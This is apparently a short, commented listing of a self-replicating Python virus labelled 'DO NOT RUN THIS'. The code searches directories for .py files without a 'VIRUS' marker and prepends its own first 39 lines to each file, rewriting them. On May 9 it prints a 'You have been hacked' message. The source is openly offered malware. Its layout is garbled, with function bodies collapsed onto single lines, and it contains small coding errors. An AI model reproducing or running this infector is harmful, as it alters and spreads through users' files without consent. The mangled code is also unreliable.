# DO NOT RUN THIS



This part has the shebang w/ python3 interpreter it also imports the OS and the date and time.
#!/usr/bin/python3

import os

import datetime

# This looks for files with the ".py" file extention and checks to see if it has SIGNATURE in it and flags them to be infected if they do not contain it
SIGNATURE = "VIRUS"

def locate(path): files_targeted = [] filelist = os.listdir(path) for fname in filelist: if os.path.isdir(path+"/"+fname): files_targeted.extend(locate(path+"/"+fname)) elif fname[-3:] == ".py": infected = False for line in open(path+"/"+fname): if SIGNATURE in line: infected = True break if infected == False: files_targeted.append(path+"/"+fname) return files_targeted

# This takes the flagged files and appends the first 39 lines of its own code essentially making all the files replicate the original virus
def infect(files_targeted): virus = open(os.path.abspath(file)) virusstring = "" for i,line in enumerate(virus): if 0 <= i < 39: virusstring += line virus.close for fname in files_targeted: f = open(fname) temp = f.read() f.close() f = open(fname,"w") f.write(virusstring + temp) f.close()

# This checks to see if the date is MAY 09 and then prints out "You have been hacked"
def detonate():

if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:

   print("You have been hacked")
# This calls the the previously defined functions and executes the code on the 9th of May
files_targeted = locate(os.path.abspath("")) infect(files_targeted) detonate()